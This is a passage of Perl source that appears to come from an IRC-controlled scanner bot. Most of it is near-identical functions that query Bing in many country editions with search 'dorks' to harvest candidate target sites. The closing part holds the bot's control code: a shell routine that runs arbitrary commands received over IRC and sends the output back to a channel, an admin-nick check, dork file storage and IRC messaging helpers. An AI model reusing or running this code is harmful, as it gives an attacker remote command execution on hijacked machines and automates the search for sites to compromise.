        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

                        my $link = $1;

            if ($link !~ /google/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingDE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=de&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingDE/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub bingUK() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=uk&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingUK/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingCA() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ca&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingCA/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingBR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=br&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingBR/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingFR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=fr&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingFR/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingES() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=es&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingES/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingIT() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=it&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingIT/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub bingBE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=be&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingBE/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingNL() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nl&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingNL/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingPT() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=pt&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingPT/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingNO() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=no&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingNO/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingDK() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=dk&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingDK/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingSE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=se&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingSE/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub bingCH() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ch&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingCH/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingNZ() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nz&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingNZ/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingRU() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ru&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingRU/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingJP() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=jp&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingJP/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingCN() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cn&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingCN/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingKR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=kr&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingKR/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub bingMX() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=mx&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingMX/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingAR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ar&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingAR/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingCL() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cl&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingCL/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingAU() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=au&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingAU/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

#########################################

 

sub clean() {

    my @cln = ();

    my %visit = ();

    foreach my $element (@_) {

        $element =~ s/\/+/\//g;

        next if $visit{$element}++;

        push @cln, $element;

    }

    return @cln;

}

 

sub key() {

    my $dork = $_[0];

    $dork =~ s/ /\+/g;

    $dork =~ s/:/\%3A/g;

    $dork =~ s/\//\%2F/g;

    $dork =~ s/\?/\%3F/g;

    $dork =~ s/&/\%26/g;

    $dork =~ s/\"/\%22/g;

    $dork =~ s/,/\%2C/g;

    $dork =~ s/\\/\%5C/g;

        $dork =~ s/@/\%40/g;

        $dork =~ s/\[/\%5B/g;

        $dork =~ s/\]/\%5D/g;

        $dork =~ s/\?/\%3F/g;

        $dork =~ s/\=/\%3D/g;

        $dork =~ s/\|/\%7C/g;

    return $dork;

}

 

sub links() {

    my @list;

    my $link = $_[0];

    my $host = $_[0];

    my $hdir = $_[0];

    $hdir =~ s/(.*)\/[^\/]*$/\1/;

    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

    $host .= "/";

    $link .= "/";

    $hdir .= "/";

    $host =~ s/\/\//\//g;

    $hdir =~ s/\/\//\//g;

    $link =~ s/\/\//\//g;

    push(@list,$link,$host,$hdir);

    return @list;

}



 

sub search_engine_query() {

    my $url = $_[0];

    $url =~ s/http:\/\///;

    my $host = $url;

    my $query = $url;

    my $page  = "";

    $host =~ s/href=\"?http:\/\///;

    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

    $query =~ s/$host//;

    if ($query eq "") { $query = "/"; }

        eval {

            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;

			my $sget = "GET $query HTTP/1.0\r\n";

			   $sget .= "Host: $host\r\n";

			   $sget .= "Accept: */*\r\n";

			   $sget .= "User-Agent: $uagent\r\n";

			   $sget .= "Connetion: Close\r\n\r\n";

			print $sock $sget;

           # print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";

            my @pages = <$sock>;

            $page = "@pages";

            close($sock);

        };

    return $page;

}

 

sub engineQuery() {

	my $url = $_[0];

	$url =~ s/http:\/\///;

	my $host = $url;

	my $query = $url;

	my $page  = "";

	$host =~ s/href=\"?http:\/\///;

	$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

	$query =~ s/$host//;

	if ($query eq "") { $query = "/"; }

		eval {

			my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;

			my $sget = "GET $query HTTP/1.0\r\n";

			$sget .= "Host: $host\r\n";

			$sget .= "Accept: */*\r\n";

			$sget .= "User-Agent: $uagent\r\n";

			$sget .= "Connetion: Close\r\n\r\n";

			print $sock $sget;

			my @pages = <$sock>;

			$page = "@pages";

			close($sock);

		};

	return $page;

} 

#########################################

 

sub shell() {

    my $chan = $_[0];

    my $cmd = $_[1];

    if ($cmd =~ /cd (.*)/) {

        chdir("$1") || &msg("$chan","No such file or directory");

        return;

    }

    elsif ($pid = fork) { waitpid($pid, 0); }

    else { if (fork) { exit; } else {

        my @output = `$cmd 2>&1 3>&1`;

        my $c = 0;

        foreach my $output (@output) {

            $c++;

            chop $output;

            &msg("$chan","$output");

            if ($c == 5) { $c = 0; sleep 3; }

        }

        exit;

    }}

}

 

sub isAdmin() {

    my $status = 0;

    my $nick = $_[0];

    if ($nick eq $admin) { $status = 1; }

    return $status;

}

 

sub read_dorks() {

        my $dork = uri_escape($_[0]);

        my $file = "dorks.txt";

        my $success = 0;

        open (file,"<$file");

        while (my $dorkx=<file>) {

                chop($dorkx);

                if ($dorkx =~ /$dork/){

                $success = 1;

                }

        }

        close file;

        return $success;

}

 

sub write_dorks() {

        my $dorks = uri_escape($_[0]);

        my $file = "dorks.txt";

        open (filex,">>$file");

        print filex $dorks."\n";

        close filex;

}



sub msg() {

    return unless $#_ == 1;

    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");

}

 

sub nick() {

    return unless $#_ == 0;

    sendraw("NICK $_[0]");

}

 

sub notice() {

    return unless $#_ == 1;

    sendraw("NOTICE $_[0] :$_[1]");

}
